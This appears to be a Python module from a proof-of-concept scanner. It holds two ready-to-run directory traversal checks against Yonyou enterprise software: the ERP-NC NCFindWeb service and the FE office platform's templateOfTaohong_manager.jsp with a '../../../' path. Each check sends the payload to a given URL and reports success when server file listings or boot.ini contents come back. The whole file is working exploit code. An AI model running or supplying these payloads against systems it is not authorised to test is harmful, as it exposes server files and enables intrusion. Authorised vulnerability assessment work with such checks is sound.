from poc import core

def check_erp(url):
    name = '用友 ERP-NC NCFindWeb 目录遍历漏洞'
    core.start_echo(name)
    path = "/NCFindWeb?service=IPreAlertConfigService&filename="
    r = core.get(url, path)
    if r:
        if "jsp" in r.text:
            core.end_echo(name, 'Payload：' + url + path)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)

def check_templateOfTaohong_manager_dt(url):
    name = '用友FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞'
    core.start_echo(name)
    path = "/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
    r = core.get(url, path)
    if r:
        if "boot.ini" in r.text:
            core.end_echo(name, 'Payload：' + url + path)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)